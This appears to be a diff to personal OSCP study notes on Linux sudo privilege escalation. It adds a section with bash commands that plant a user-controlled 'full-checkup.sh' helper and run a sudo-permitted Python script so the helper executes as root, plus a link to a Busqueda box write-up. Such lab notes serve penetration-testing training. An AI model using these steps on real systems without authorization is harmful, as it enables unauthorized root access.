@@ -224,6 +224,7 @@ sudo /bin/nano $SudoFile
 - [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- `pi` had unrestricted `NOPASSWD: ALL`, so a direct sudo identity proof completed escalation
 - [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- a wildcard after the rdiff-backup server restrictions allowed a duplicate root path and read-only root mirror
 - [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- sudo -l yielded no route; capability enumeration became decisive
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- wildcarded sudo arguments exposed Docker inspection and a relative `full-checkup.sh` helper path
 
 ## Chef Knife Ruby evaluation
 
@@ -259,6 +260,26 @@ whoami
 ## Rdiff-backup server restriction branch
 
 When the exact sudo rule permits `rdiff-backup --server` with a trailing `*`, do not treat it as an ordinary GTFOBins binary. Read the fixed arguments, test duplicate `--restrict-path` behaviour, and follow [[Linux - Rdiff-Backup Sudo Abuse]] for the protocol-aware read-only proof.
+
+## Relative helper path in a sudo Python wrapper
+
+If sudo allows a script with a wildcard and the script invokes a helper such as `./full-checkup.sh`, inspect the current-working-directory behavior. The helper path is resolved by the privileged process, so a user-controlled helper in a directory the command actually uses can become root code execution.
+
+```bash
+sudo -n -l
+sed -n '1,260p' "$SudoScript"
+grep -nE 'full-checkup|arg_list|subprocess|cwd|chdir' "$SudoScript"
+printf '%s\n' '#!/bin/bash' 'id > /tmp/root-proof.txt' > "$HOME/full-checkup.sh"
+chmod 700 "$HOME/full-checkup.sh"
+cd "$HOME"
+sudo /usr/bin/python3 "$SudoScript" full-checkup
+cat /tmp/root-proof.txt
+```
+
+The proof should be a root identity written by the helper. Replace the proof-only command with the authorized objective, preserve the original script, and remove the helper during [[Linux - Clean Down]]. The exact `cd` matters: placing the helper in one directory and invoking sudo from another may leave the privileged relative path unresolved.
+
+> [!warning] 💡
+> Do not assume a relative path is resolved from the script directory. Trace `os.getcwd()`, `subprocess` arguments, and any `chdir()` call before building the helper.
 
 ## Shocker example
 
